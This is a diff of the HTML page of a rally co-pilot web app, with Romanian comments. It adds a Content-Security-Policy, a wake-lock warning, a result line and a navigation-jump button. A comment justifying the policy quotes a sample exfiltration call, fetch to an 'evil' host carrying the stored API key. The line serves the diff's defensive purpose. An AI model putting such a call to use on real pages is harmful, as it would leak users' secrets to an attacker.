@@ -8,6 +8,14 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta name="apple-mobile-web-app-title" content="RALI">
   <title>RALI Co-pilot</title>
+  <!-- CSP = plasa de siguranță sub cheia din localStorage. Codul e curat azi (fiecare
+       innerHTML verificat), dar CSP-ul e ce garantează că o scăpare viitoare de XSS
+       printr-un roadbook fotografiat nu poate exfiltra cheia: connect-src permite doar
+       self + api.anthropic.com, deci fetch('https://evil/?k=...') moare în browser.
+       'unsafe-inline' la style e pentru atributele style="..." din markup; blob: la
+       default-src e pentru descărcarea exportului JSON. Fără scripturi inline în pagină. -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self' blob:; script-src 'self'; connect-src 'self' blob: https://api.anthropic.com; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'none'; form-action 'none'">
+  <meta name="referrer" content="no-referrer">
   <link rel="manifest" href="manifest.json">
   <link rel="icon" href="icon.svg" type="image/svg+xml">
   <link rel="stylesheet" href="style.css">
@@ -24,6 +32,9 @@
         <span id="rt-badge" class="rt-badge hidden">RT</span>
       </span>
     </header>
+    <!-- Vizibil doar când cererea de wake lock e respinsă (economisire de baterie):
+         fără el, singurul semn era o iconiță de 14px cu opacitate 0,3. -->
+    <div id="wake-warn" class="wake-warn hidden">⚠ Ecranul se poate stinge singur — oprește economisirea bateriei (Settings → Battery)</div>
 
     <!-- ══════════════════════════════════════════
          TAB: VITEZĂ
@@ -70,6 +81,8 @@
 
       <!-- Setup panel -->
       <div id="rt-setup">
+        <!-- Rezultatul ultimului RT, înghețat până la următorul START — cifra pentru tracker -->
+        <p class="info-line hidden" id="rt-result" style="border:1px solid var(--border); border-radius:10px; padding:9px 12px; font-weight:600;"></p>
         <p class="section-label">PRESETĂRI RT</p>
         <div class="preset-row" id="preset-row"></div>
         <p class="info-line hidden" id="preset-hint" style="opacity:.75">Nicio presetare — RT-urile de la Sibiu nu sunt publicate încă. Le adaugi din roadbook cu „+ salvează".</p>
@@ -237,6 +250,9 @@
           <button class="btn btn-sec" id="btn-off-p10">+10m</button>
           <button class="btn btn-sec" id="btn-off-p100">+100m</button>
         </div>
+        <!-- Repornire la mijloc de leg (ex. după pauza de la Orlat): fără asta, singura
+             cale era 200 de apăsări pe +100m -->
+        <button class="btn btn-sec" id="btn-nav-jump">⏩ Sunt la box…</button>
 
         <button class="btn btn-danger btn-lg" id="btn-nav-stop">■ STOP NAVIGARE</button>
       </div>
